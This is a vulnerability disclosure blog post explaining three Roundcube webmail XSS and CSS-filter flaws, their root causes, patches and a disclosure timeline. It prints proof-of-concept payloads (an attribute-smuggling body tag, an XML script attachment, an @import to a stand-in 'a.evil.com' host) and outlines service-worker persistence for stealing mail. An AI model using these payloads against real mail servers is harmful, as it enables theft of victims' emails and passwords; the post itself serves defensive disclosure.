Government Emails at Risk: Critical Cross-Site Scripting Vulnerability in Roundcube Webmail

Oskar Zeino-Mahmalat photo

##
#
https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/
#
https://github.com/advisories/GHSA-j43g-prf4-578j
#
https://github.com/advisories/GHSA-36j9-fp7f-7f7m
#
https://github.com/bartfroklage/CVE-2024-37383-POC
#
https://fieldeffect.com/blog/roundcube-webmail-flaw-actively-exploited
#
##


Vulnerability Researcher

August 5, 2024
Date

Security


Update 2024-08-27: Full technical details added.

Key Information
Sonar’s Vulnerability Research Team recently discovered a critical Cross-Site Scripting (XSS) vulnerability in Roundcube, a popular open-source webmail software.
When a victim views a malicious email in Roundcube sent by an attacker, the attacker can execute arbitrary JavaScript in the victim's browser. 
Attackers can abuse the vulnerability to steal emails, contacts, and the victim's email password as well as send emails from the victim's account.
In October 2023, ESET Research reported that a similar vulnerability was actively used by the APT group Winter Vivern to attack European government entities.
Roundcube administrators should update to the patched version 1.6.8 or 1.5.8 as soon as possible.
All discovered issues are tracked as CVE-2024-42008, CVE-2024-42009, CVE-2024-42010.


Introduction
Roundcube is a popular open-source webmail software that enables users to check their emails right in their browser without needing dedicated client software. It is included by default in the server hosting panel cPanel leading to millions of installations around the globe, according to Shodan. It is also used by universities as well as government agencies.



Government employees' emails are a valuable target for Advanced Persistent Threat (APT) groups engaged in espionage. ESET Research and Insikt Group both report documented attack campaigns by the Winter Vivern APT in 2023, targeting Roundcube servers of the Ukrainian military, Georgian Defense Ministry, and other European entities. These attacks abused a similar Cross-Site Scripting (XSS) zero-day vulnerability in Roundcube to steal emails or passwords from victims who viewed a malicious email.



In this article, we explain the vulnerabilities we discovered in Roundcube, show how attackers could exploit them for a higher impact, and describe how similar vulnerabilities in web mailers can be prevented.

Impact
Roundcube in version 1.6.7 and below, and in version 1.5.7 and below, is vulnerable to the XSS vulnerabilities CVE-2024-42009 and CVE-2024-42008, which have critical and high ratings respectively. These allow an unauthenticated attacker to steal emails and contacts, as well as send emails from a victim's account. All the victim user has to do is view a malicious email in Roundcube.



Attackers can gain a persistent foothold in the victim's browser across restarts, allowing them to exfiltrate emails continuously or steal the victim's password the next time it is entered. For a successful attack, no user interaction beyond viewing the attacker's email is required to exploit the critical XSS vulnerability (CVE-2024-42009). For CVE-2024-42008, a single click by the victim is needed for the exploit to work, but the attacker can make this interaction unobvious for the user.



This video demonstrates how an attack could look like using a Roundcube test instance:


We suspect that dedicated attackers like Winter Vivern will abuse these vulnerabilities at some point, as they have already shown that they can discover and exploit similar XSS vulnerabilities. That is why we strongly advise Roundcube administrators to apply the latest patch, version 1.6.8, or 1.5.8, as soon as possible to protect their organization's users. Users who suspect that they are affected should change their email password and additionally clear the site data of the Roundcube site they are using in their browser.

Technical Details
In this section, we explain the root cause of the two XSS vulnerabilities we discovered: Desanitization and unsafe Content-Types. We also detail holes in the CSS filtering of Roundcube that can be abused to aid an XSS attack and how the unsafe Content-Type issue can be abused by attackers to gain additional persistence in the victim's browser.

Desanitization in Inline Email Rendering (CVE-2024-42009)
We are all used to HTML emails with nice-looking formatting and styles. Roundcube needs to sanitize the HTML before rendering it in your browser to prevent XSS attacks. Roundcube uses washtml for this, a custom server-side sanitizer. We did not find an issue in the sanitization logic itself. Instead, we looked into modifications after sanitization that could lead to Desanitization, when sanitized HTML is made harmful again.



We discovered a Desanitization issue when emails are prepared for display in the message_body() function. The issue can be abused to smuggle an XSS payload in an email through the sanitizer undetected, which can become a new event handler attribute because of a later modification.

```
public static function message_body($attrib)
{
  // ...
  // Parse the part content for display
  // [1] sanitize
  $body = self::print_body($body, $part, $body_args);
  // ...
  if ($part->ctype_secondary == 'html') {
     // [2] modify -> desanitization
     $body = self::html4inline($body, $body_args); 
  }
  // [3] desanitized html is displayed
  $out .= html::div($body_args['container_attrib'], $plugin['prefix'] . $body);
  // ...
}
```

At [1], the HTML body of the mail is sanitized inside of print_body(), which uses washtml for the sanitization. The return value is a full HTML document though. Roundcube does not use an iframe to render the HTML email separate from the main page. Instead, it is transformed into an HTML snippet to become a part of the whole Roundcube page in html4inline() [2]. We will see that this is dangerous since the modifications performed here can break the sanitized HTML. Finally, the desanitized HTML is appended to the output buffer $out and later rendered [3].



The html4inline() function transforms a full HTML document into a snippet by removing <!DOCTYPE>, <head>, and other elements. It replaces <body> with <div>, as the main page already has a <body> element. There is also some logic to remove the legacy attributes bgcolor, text, and background from the <body> element. They are replaced with equivalent CSS inside a newly added style attribute. 



The <body> element and its attributes are parsed using a simple regex. The input of html4inline() is already sanitized, so all stray angle brackets in attributes or elsewhere are encoded or removed, making this a safe approach.

```
public static function html4inline($body, &$args)
{
  //...
  $regexp = '/<body([^>]*)/';

  // Handle body attributes that doesn't play nicely with div elements
  if (preg_match($regexp, $body, $m)) {
    $style = [];
    $attrs = $m[0];
    // ...
  }
}
```

The $attrs variable now contains all attributes of <body> as a string. Another regex extracts each of the legacy attributes from $attr. Zooming in on the bgcolor regex, we see that it performs attribute parsing for all possible delimiters: double, single, or no quotes.


/\s?bgcolor=["\']*[a-z0-9#]+["\']*/i
But this regex is faulty! It does not check if it happens to match inside an attribute value or not. The text bgcolor=something could easily show up inside of another attribute. The regex also does not check if the matched attribute value starts and ends with the same quote type or no quote at all. This incorrect parsing can be abused to break the otherwise safe HTML, as everything matching the regex is removed. The breakage occurs when an uneven number of quotes is removed. Subsequent attribute values can escape and become new attributes like event handlers with an XSS payload.



Here is an example of this: bgcolor is matched inside an attribute value, and the closing quote is also matched and removed. 
 The hidden onload inside the name attribute becomes a new attribute because of the quote imbalance.

```
<body title="bgcolor=foo" name="bar onload=alert(origin)">
preg_replace() --->
<body title=" name="bar onload=alert(origin)">
```


Because html4inline() is used after sanitization, malicious attributes that are introduced this way are not removed. Later, the <body> is transformed into a <div> by simply replacing the prefix <body with <div. An attacker needs to adapt their XSS payload to work with <div>, so onload does not work. Instead, onanimationstart can be used with an existing animation from the Bootstrap CSS framework loaded in Roundcube.

```
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar">
  Foo
</body>
```


There are no further mitigations used like a Content-Security-Policy (CSP) or a sandboxed iframe.
This simple email body is enough to execute JavaScript in the victim's browser and access their emails. And it is not the only XSS vulnerability we discovered.

Unsafe Content-Types for Attachments (CVE-2024-42008)
Roundcube has two ways to access attachments: an Open button and a Download button. Both buttons open the same link in a popup, but the Download button adds a _download=1 query parameter. 


https://roundcube.example?_task=mail&_mbox=INBOX&_part=2&_action=get&_uid=1337&_download=1
Depending on the presence of this query parameter, the Content-Disposition header is set to attachment or inline. This header tells the browser whether a resource should be downloaded instead of displayed in the browser. The filename, MIME type, and charset of the attachment are also sent as headers to the browser. 

```
$rcmail->output->download_headers($filename, [
    'type' => $mimetype,
    'type_charset' => $attachment->charset,
    'disposition' => !empty($_GET['_download']) ? 'attachment' : 'inline',
]);
// ...
$attachment->output($mimetype);
```

Displaying an arbitrary attachment with an arbitrary MIME type in the browser can lead to XSS, for example when the attachment is an HTML file. There are almost no checks in place for the MIME type here, even though it comes from a potentially malicious email. For text/html and image/svg+xml, the washtml sanitizer is used again. But for all other MIME types, Roundcube displays the attachment inline and without changes. Attackers can abuse this with an XML file as well as other MIME types to trigger XSS.

```
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
    alert(origin)
</something:script>
```

This issue is not new. It is tracked as CVE-2020-13965 and was supposedly fixed by disabling the Open button for text/xml files. For other dangerous MIME types, the Open button was already disabled. However, the unsafe behavior of displaying all attachments in the browser is still there. Users can just no longer click anywhere to navigate to the link that triggers the XSS. But what if an attacker just adds the necessary link to the email body and convinces the victim to click it? Then the attack would work again.



As seen above, attachment links have a simple format. They contain the IMAP UID, folder, and MIME part number to identify the attachment. Usually, the folder is called "INBOX" and the part number is 2, with part 1 being the HTML body of the email. So an attacker only needs to guess or leak the UID somehow, as a victim probably would not click on hundreds of links with different UID values.



In our other blog posts about web mailers like ProtonMail, we have seen that CSS in the email body can be abused to leak attribute values on the current page. An attacker can try the same with Roundcube to leak the UID, which is part of a link on the page.

CSS Filter Bypass (CVE-2024-42010)
The main prevention against CSS leaks in Roundcube is not a CSP, but only a regex-based blocklist filter on the CSS text. The mod_css_styles() function tries to detect dangerous functions or rules, including url() or @import which can make connections to a remote server. String blocklists are often bypassed by abusing the syntax rules of the language, for example, comments or whitespace. That is probably why Roundcube deletes all characters except a-z(:; before performing some of the blocklist checks. 

```
public static function mod_css_styles($source, $container_id, $allow_remote = false, $prefix = '')
{        
  // ...
  $stripped = preg_replace('/[^a-z\(:;]/i', '', $source);
  $evilexpr = 'expression|behavior|javascript:|import[^a]' . 
      (!$allow_remote ? '|url\((?!data:image)' : '');
  if (preg_match("/{$evilexpr}/i", $stripped)) {
    return '/* evil! */';
  }
  // ...
}
```


To block @import rules, the word import is blocked, except when it is followed by an a to avoid blocking the valid !important keyword. This interesting regex can be bypassed, precisely because it is operating on the stripped version of the CSS, not the full CSS. An attacker can simply choose a domain name for their server that starts with an a and trick the check into seeing importa, which is allowed.

```
regex:    import[^a]
input:    @import "//a.evil.com/leak"
stripped: importaevilcomleak
```


After the blocklist check, the original unstripped CSS is used for rendering the email. The smuggled @import can now import arbitrary unfiltered CSS to leak the UID from an attribute on the page using the known import-based CSS leak technique.



With the same CSS filter bypass, the attacker can add styles that make a link in the email very large and overlay other elements. For demonstration purposes, we have colored this overlaid link in red:


The image shows the Roundcube webmail UI. The right half of the UI, which displays the currently opened email, is highlighted in red.

As soon as the victim clicks somewhere in the email view portion of the Roundcube page, the overlayed link is clicked instead. The link points to the attacker server, which redirects the victim to the malicious attachment using the now leaked UID, triggering the XSS payload. 

Service Workers for Persistent XSS
We have seen that an old issue of unsafe Content-Type headers can be combined with a new CSS leak to trigger a Stored XSS vulnerability. A usual Stored XSS vulnerability triggers every time the victim views the stored payload. In the case of emails, this is probably only once and then the email gets deleted, meaning that the attacker can also only steal emails once. 



Unfortunately, in the case of Roundcube, motivated attackers can go a step further and achieve persistence to steal emails long after the XSS payload has been triggered. They can combine the building block we already have – unsafe Content-Types for attachments – with service workers. 



A service worker is a script that the browser executes for every HTTP request on the page. It can be registered by any normal JavaScript on the page. The service worker can change the response to intercepted requests, usually for caching purposes. A malicious service worker, however, can abuse this power to add new scripts to the server's HTML response. Service workers are in effect across page loads and browser restarts, even if the worker is never registered again.



The service worker specification mitigates the risk of malicious service workers in multiple ways: A service worker script must be hosted on the same origin and served with a JavaScript Content-Type header. A Content-Security-Policy served together with the script applies to the script as well. Lastly, a service worker can only influence requests that are on the same or more nested path level than the path where the script was served.



All mitigations do not apply in the Roundcube case: Attackers can serve JavaScript files as email attachments on the Roundcube server, the same way they can serve a dangerous XML file. Roundcube does not use a CSP that could prevent the service worker registration. It also does not use paths for routing, only query parameters, so the attachment containing the service worker script is served at the root path.



Attackers can create a malicious service worker using one of the two XSS vulnerabilities, put the service worker script inside an email attachment, and use that attachment's URL for registration. The service worker can then add email- or password-stealing logic on every page load of Roundcube, as we have demonstrated in the Proof-of-Concept video above. This diagram summarizes the exploit steps:




Patches
The Roundcube maintainers fixed all findings in a straightforward way.



The Desanitization issue (CVE-2024-42009) was addressed by removing the post-processing step that caused the vulnerability.

```
 public static function message_body($attrib)
 {
   // ...
   $body = self::print_body($body, $part, $body_args);
   // ...
-  if ($part->ctype_secondary == 'html') {
-     $body = self::html4inline($body, $body_args); 
-  }
   $out .= html::div($body_args['container_attrib'], $plugin['prefix'] . $body);
   // ...
 }
```


Instead, the "legacy attribute to style" conversion was moved into the sanitization process as a hook named washtml_callback (40a4a71: program/actions/mail/index.php). The sanitizer uses more robust attribute parsing compared to the buggy regex and the attribute values are properly escaped, preventing any malicious attributes from breaking out.



Dangerous MIME types (CVE-2024-42008) are now converted to the harmless text/plain. Attachments are now also served with a restrictive CSP as an additional defense mechanism.

```
 public function download_headers($filename, $params = [])
 {
   // ...
+  if ($disposition == 'inline') {
+  if (preg_match('~(javascript|jscript|ecmascript|xml|html|text/)~i', $ctype)) {
+    $ctype = 'text/plain';
+  }
   // ...
+  // Use strict security policy to make sure no javascript content is executed
+  header("Content-Security-Policy: default-src 'none'");
```


The bypassable CSS filter (CVE-2024-42010) was improved by actually searching for @import and no longer operating on stripped CSS, among other changes.

```
 public static function mod_css_styles($source, $container_id, $allow_remote = false, $prefix = '')
 {
   // ...
   $source = self::xss_entity_decode($source);
-  $stripped = preg_replace('/[^a-z\(:;]/i', '', $source);
-  $evilexpr = 'expression|behavior|javascript:|import[^a]' . (!$allow_remote ? '|url\((?!data:image)' : '');
 
-  if (preg_match("/{$evilexpr}/i", $stripped)) {
+    // No @import allowed
+    // TODO: We should just remove it, not invalidate the whole content
+    if (stripos($source, '@import') !== false) {
       return '/* evil! */';
     }
```


If you happen to develop web mailer software yourself, you can take multiple defense-in-depth measures to better protect against XSS: Sanitize the untrusted HTML with a client-side sanitizer like DOMPurify to protect against mXSS. Avoid any modifications of the sanitized HTML to prevent Desanitization. You can then render the HTML inside a sandboxed iframe, which disables JavaScript inside the iframe. This also prevents malicious CSS in the email from changing the surrounding page or leaking data from the page, as the iframe is a completely separate document. We also recommend using a strong CSP with nonces or hashes to further mitigate any HTML injections and prevent information leaks.

Timeline
We want to thank the Roundcube maintainer Aleksander Machniak for the quick response and for publishing patches for the issues.

```
Date	Action
2024-06-18	We report all issues to the Roundcube maintainers.
2024-06-18	The maintainers acknowledge our report.
2024-07-17	The maintainers send patches for review.
2024-07-18	We send feedback for the patches.
2024-08-04	The maintainers publish patched Roundcube versions 1.6.8 and 1.5.8.
2024-08-05	We publish an initial blog post, withholding details about the vulnerabilities.
2024-08-05	MITRE publishes CVE-2024-42008, CVE-2024-42009, and CVE-2024-42010.
2024-08-27	We update this blog post with full technical details.
```


Summary
In this article, we showcased multiple vulnerabilities in Roundcube and how attackers could combine them to continuously steal emails from unsuspecting victims. Threat intel by ESET Research and Insikt Group about the APT Winter Vivern confirms that the abuse of these vulnerabilities for cyber espionage is a real threat and not just speculation. We took a deep dive into the code, figuring out the source of the vulnerabilities and also how they were fixed. Finally, we gave some general recommendations on how to prevent XSS vulnerabilities in web mailing software.



The source code of projects like Roundcube, which has been around for almost 20 years, can be very convoluted, which increases the risk of security vulnerabilities. Adopting Clean Code principles can shed light on the dark corners that have emerged over time. By ensuring that the code remains maintainable, reliable, and secure, developers can more easily identify and address complex security issues such as Desanitization that are often hidden in convoluted code.

